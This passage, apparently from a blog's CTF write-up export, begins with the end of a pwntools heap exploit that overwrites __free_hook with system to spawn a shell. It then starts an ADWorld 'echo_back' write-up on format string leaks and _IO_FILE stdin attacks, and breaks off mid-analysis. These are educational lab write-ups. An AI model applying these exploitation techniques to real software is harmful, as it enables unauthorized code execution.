32-bit</span></span><br><span class="line"><span class="comment"># and must cover other complete chunks (for example: 0x4b1, 0x660)</span></span><br><span class="line"><span class="comment"># if incompletly overlap other chunk will cause double free check</span></span><br><span class="line">func_9011(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">##########################DEBUG#####################################</span></span><br><span class="line"><span class="comment"># print pidof(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment">####################################################################</span></span><br><span class="line"></span><br><span class="line">free_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># free chunk 1 to unsorted bin</span></span><br><span class="line">alloc(<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">free_func()</span><br><span class="line"><span class="comment"># split fake chunk 1, and pass `unsorted bin` fd to chunk 2</span></span><br><span class="line">alloc(<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recv(<span class="number">1</span>) <span class="comment"># byte &#x27;2&#x27;</span></span><br><span class="line">addr = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main_arena_88 = u64(addr[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook_addr = (main_arena_88 &amp; <span class="number">0xfffffffffffff000</span>) + (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>) <span class="comment"># calculate malloc hook</span></span><br><span class="line">libc_base = malloc_hook_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget_addr = libc_base +  <span class="number">0x4f2c5</span> <span class="comment"># or 0x4f322 # or 0x10a38c         </span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;+++++++++++++++++++++++++++++++++++++++++++++++++++++&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;main arena + 0x88: &#x27;</span> + <span class="built_in">hex</span>(main_arena_88)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;malloc hook addr: &#x27;</span> + <span class="built_in">hex</span>(malloc_hook_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;free hook addr: &#x27;</span> + <span class="built_in">hex</span>(free_hook_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;one gadget addr: &#x27;</span> + <span class="built_in">hex</span>(one_gadget_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;+++++++++++++++++++++++++++++++++++++++++++++++++++++&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook addr to chunk 3&#x27;s fd</span></span><br><span class="line">payload2 = <span class="number">0x30</span>*<span class="string">&#x27;2&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(free_hook_addr)</span><br><span class="line">func_9011(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc __free_hook out</span></span><br><span class="line">alloc(<span class="number">0x40</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># alloc(0x40,p64(one_gadget_addr))  # not working</span></span><br><span class="line">alloc(<span class="number">0x40</span>,p64(system_addr)) <span class="comment"># write system addr to free hook</span></span><br><span class="line">alloc(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free_func()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (IO_FILE related)</title>
    <url>/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-IO-FILE-related/</url>
    <content><![CDATA[<h2 id="echo-back"><a href="#echo-back" class="headerlink" title="echo_back"></a>echo_back</h2><p>Attachment: <a href="/filehost/apcaw/echo_back.zip">echo_back.zip</a><br>Description: None</p>
<p>It contains a format string vulnerability, and needs to attack <code>scanf</code> in <code>IO_FILE</code>.</p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ unzip echo_back.zip</span><br><span class="line">Archive:  echo_back.zip</span><br><span class="line">  inflating: echo_back</span><br><span class="line">  inflating: libc.so.6</span><br></pre></td></tr></table></figure>
<p>And check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file echo_back</span><br><span class="line">echo_back: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=232ab9c69cf82998f32667c8b2aca67bee869ee5, stripped</span><br><span class="line">$ checksec echo_back</span><br><span class="line">[*] &#x27;/root/echo_back&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ ./libc.so.6</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// ST0C_4</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">banner</span>();</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="built_in">menu</span>();</span><br><span class="line">      result = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">echo_back</span>(&amp;s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> &amp;&amp; !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">set_name</span>(&amp;s);</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>set_name</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">set_name</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, a1, <span class="number">7uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>echo_back</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">echo_back</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;length:&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">  <span class="keyword">if</span> ( (nbytes &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> || (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">6</span> )</span><br><span class="line">    <span class="built_in">LODWORD</span>(nbytes) = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s say:&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;anonymous say:&quot;</span>, (<span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>In <code>echo_back()</code> we find this format string vulnerability:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<p>We can leak things, but if we want to write something…</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (nbytes &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> || (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">6</span> )</span><br><span class="line">  <span class="built_in">LODWORD</span>(nbytes) = <span class="number">7</span>;</span><br></pre></td></tr></table></figure>
<p>The payload should be no longer than 7 bytes. So here uses format string to enable us to edit the <code>_IO_FILE</code> structure of <code>stdin</code>(<code>_IO_2_1_stdin_</code>)</p>
<p>Anyway, let’s leak something first. Go to where vulnerability occurs (<code>printf((const char *)&amp;nbytes + 4);</code>) and check the stack:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># here is where we stop</span><br><span class="line">pwndbg&gt; context</span><br><span class="line">...</span><br><span class="line">─────────────────────────────────[ DISASM ]─────────────────────────────────</span><br><span class="line">   0x555555554c2c    call   printf@plt &lt;0x555555554890&gt;</span><br><span class="line"></span><br><span class="line">   0x555555554c31    jmp    0x555555554c44</span><br><span class="line">    ↓</span><br><span class="line">   0x555555554c44    lea    rax, [rbp - 0x10]</span><br><span class="line">   0x555555554c48    mov    rdi, rax</span><br><span class="line">   0x555555554c4b    mov    eax, 0</span><br><span class="line"> ► 0x555555554c50    call   printf@plt &lt;0x555555554890&gt;</span><br><span class="line">        format: 0x7fffffffe1a0 ◂— 0x746e65746e6f63 /* &#x27;content&#x27; */</span><br><span class="line">        vararg: 0x7fffffffbb00 ◂— 0x206d616e656d616e (&#x27;namenam &#x27;)</span><br><span class="line"></span><br><span class="line">   0x555555554c55    nop</span><br><span class="line">   0x555555554c56    mov    rax, qword ptr [rbp - 8]</span><br><span class="line">   0x555555554c5a    xor    rax, qword ptr fs:[0x28]</span><br><span class="line">   0x555555554c63    je     0x555555554c6a</span><br><span class="line"></span><br><span class="line">   0x555555554c65    call   __stack_chk_fail@plt &lt;0x555555554888&gt;</span><br><span class="line">...</span><br><span class="line"># and here is what stack looks like</span><br><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ rsp  0x7fffffffe180 ◂— 0x0</span><br><span class="line">01:0008│      0x7fffffffe188 —▸ 0x7fffffffe1d0 ◂— 0x6d616e656d616e /* &#x27;namenam&#x27; */</span><br><span class="line">02:0010│      0x7fffffffe190 ◂— 0x555555550a32 /* &#x27;2\nUUUU&#x27; */</span><br><span class="line">03:0018│      0x7fffffffe198 ◂— 0x722aa5300</span><br><span class="line">04:0020│ rdi  0x7fffffffe1a0 ◂— 0x746e65746e6f63 /* &#x27;content&#x27; */</span><br><span class="line">05:0028│      0x7fffffffe1a8 ◂— 0xe825ac4022aa5300</span><br><span class="line">06:0030│ rbp  0x7fffffffe1b0 —▸ 0x7fffffffe1e0 —▸ 0x555555554d30 ◂— push   r15</span><br><span class="line">07:0038│      0x7fffffffe1b8 —▸ 0x555555554d08 ◂— jmp    0x555555554d0b</span><br><span class="line">08:0040│      0x7fffffffe1c0 —▸ 0x555555554d30 ◂— push   r15</span><br><span class="line">09:0048│      0x7fffffffe1c8 ◂— 0x200000001</span><br><span class="line">0a:0050│ r10  0x7fffffffe1d0 ◂— 0x6d616e656d616e /* &#x27;namenam&#x27; */</span><br><span class="line">0b:0058│      0x7fffffffe1d8 ◂— 0xe825ac4022aa5300</span><br><span class="line">0c:0060│      0x7fffffffe1e0 —▸ 0x555555554d30 ◂— push   r15</span><br><span class="line">0d:0068│      0x7fffffffe1e8 —▸ 0x7ffff7e20cca (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">0e:0070│      0x7fffffffe1f0 —▸ 0x7fffffffe2d8 —▸ 0x7fffffffe4fc ◂— &#x27;/root/echo_back&#x27;</span><br><span class="line">0f:0078│      0x7fffffffe1f8 ◂— 0x100000000</span><br><span class="line">10:0080│      0x7fffffffe200 —▸ 0x555555554c6c ◂— push   rbp</span><br><span class="line">11:0088│      0x7fffffffe208 —▸ 0x7ffff7e207d9 (init_cacheinfo+297) ◂— mov    rbp, rax</span><br><span class="line">12:0090│      0x7fffffffe210 ◂— 0x0</span><br><span class="line">13:0098│      0x7fffffffe218 ◂— 0x32dccbb0e1bb4c3f</span><br><span class="line">14:00a0│      0x7fffffffe220 —▸ 0x5555555548e0 ◂— xor    ebp, ebp</span><br><span class="line">15:00a8│      0x7fffffffe228 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">18:00c0│      0x7fffffffe240 ◂— 0x67899ee5b83b4c3f</span><br><span class="line">19:00c8│      0x7fffffffe248 ◂— 0x67898ede62dd4c3f</span><br><span class="line">1a:00d0│      0x7fffffffe250 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1d:00e8│      0x7fffffffe268 ◂— 0x1</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
<p>The most obvious one is this with <code>__libc_start_main</code>, we can calculate <code>libc base</code> from it:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0d:0068│      0x7fffffffe1e8 —▸ 0x7ffff7e20cca (__libc_start_main+240) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>
<p>And the <code>old rbp address</code> (in <code>main()</code> frame) is stored in <code>rbp</code>, from which we can infer the old return address (of <code>main()</code>), by adding <code>0x8</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">06:0030│ rbp  0x7fffffffe1b0 —▸ 0x7fffffffe1e0 —▸ 0x555555554d30 ◂— push   r15</span><br></pre></td></tr></table></figure>
<p>Here is the return address of <code>echo_back()</code>, and from this we can calculate <code>main</code> address:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">07:0038│      0x7fffffffe1b8 —▸ 0x555555554d08 ◂— jmp    0x555555554d0b</span><br></pre></td></tr></table></figure>
<p>But where it actually points to? It is not indicated in <code>pwndbg</code>, so we go back to binary:</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000000C6C main            proc <span class="built_in">near</span>               <span class="comment">; DATA XREF: start+1D↑o</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D03                 <span class="keyword">call</span>    echo_back</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D08                 <span class="keyword">jmp</span>     short loc_D0B</span><br></pre></td></tr></table></figure>
<p>As we know, <code>call</code> in assembly codes can be interpreted as:</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">IP</span> <span class="comment">; push rip</span></span><br><span class="line"><span class="keyword">jmp</span> <span class="built_in">near</span> <span class="built_in">ptr</span> <span class="comment">; jmp echo_back</span></span><br></pre></td></tr></table></figure>
<p>The <code>rip</code> here in binary is <code>0x0D08</code> and the <code>main</code> address is <code>0x0C6C</code>, so the return address there should be <code>main addr + (0x0C6C-0x0D08)</code> &#x3D; <code>main addr + 0x9C</code>. Therefore the <code>main address</code>(and <code>elf base</code>) can be obtained by leaking and calculating (<code>- 0x9C</code>).</p>
<p>By the way, as I input <code>namename</code> before, in <code>set_name()</code>, it is also stored in stack:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0a:0050│ r10  0x7fffffffe1d0 ◂— 0x6d616e656d616e /* &#x27;namenam&#x27; */</span><br></pre></td></tr></table></figure>
<p>And the things it reads in <code>echo_back</code> (<code>read(0, (char *)&amp;nbytes + 4, (unsigned int)nbytes);</code>), I input <code>content</code> and find it at:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">04:0020│ rdi  0x7fffffffe1a0 ◂— 0x746e65746e6f63 /* &#x27;content&#x27; */</span><br></pre></td></tr></table></figure>

<p>As for how to leak by exploiting format string vuln, because it’s on <code>64-bit</code>, first 6 parameters of a func is stored in registers, so our payloads should be:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">%10<span class="variable">$p</span>:  to get content</span><br><span class="line">%12<span class="variable">$p</span>:  to get <span class="string">&#x27;rbp addr&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;main()&#x27;</span> frame</span><br><span class="line">%13<span class="variable">$p</span>:  to get <span class="string">&#x27;ret addr&#x27;</span> of <span class="string">&#x27;echo_back()&#x27;</span> and calculate <span class="string">&#x27;main addr&#x27;</span></span><br><span class="line">%16<span class="variable">$p</span>:  to get the name we <span class="built_in">set</span> <span class="keyword">in</span> <span class="string">&#x27;set_name()&#x27;</span></span><br><span class="line">%19<span class="variable">$p</span>:  to get address of <span class="string">&#x27;__libc_start_main&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Though we can control the program flow, we cannot write a only 7-byte payload&#x2F;shellcode, so here we need to attack <code>scanf</code>. The <code>scanf</code> reads data from <code>stdin</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p * stdin</span><br><span class="line">$1 = &#123;</span><br><span class="line">  _flags = -72540021,</span><br><span class="line">  _IO_read_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_read_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_read_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x0,</span><br><span class="line">  _fileno = 0,</span><br><span class="line">  _flags2 = 0,</span><br><span class="line">  _old_offset = -1,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;&quot;,</span><br><span class="line">  _lock = 0x7ffff7dd3790 &lt;_IO_stdfile_0_lock&gt;,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x7ffff7dd19c0 &lt;_IO_wide_data_0&gt;,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = 0,</span><br><span class="line">  _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Actually <code>stdin</code>, <code>stdout</code> and <code>stderr</code> are all <code>_IO_FILE</code> structures defined in <code>glibc-2.23\libio\libio.h</code>, announced in <code>glibc-2.23\libio\stdio.h</code>. </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// in `glibc-2.23\libio\libio.h` --------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// in `glibc-2.23\libio\stdio.h` --------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Standard streams.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdin</span>;</span>		<span class="comment">/* Standard input stream.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdout</span>;</span>		<span class="comment">/* Standard output stream.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stderr</span>;</span>		<span class="comment">/* Standard error output stream.  */</span></span><br><span class="line"><span class="comment">/* C89/C99 say they&#x27;re macros.  Make them happy.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stdin stdin</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stdout stdout</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stderr stderr</span></span><br></pre></td></tr></table></figure>
<p>They are all file pointers, and in the file reading process it depends on <code>_IO_new_file_underflow</code> function to call the syscall <code>_IO_SYSREAD</code>. In file <code>glibc-2.23\libio\fileops.h</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">... </span><br><span class="line"><span class="comment">// a limit</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">... </span><br><span class="line"><span class="comment">// action of `_IO_SYSREAD` is about `_IO_buf_base` and `_IO_buf_end`</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">... </span><br><span class="line"><span class="comment">// this helps to bypass first limit</span></span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">... </span><br><span class="line"><span class="comment">// till the end</span></span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
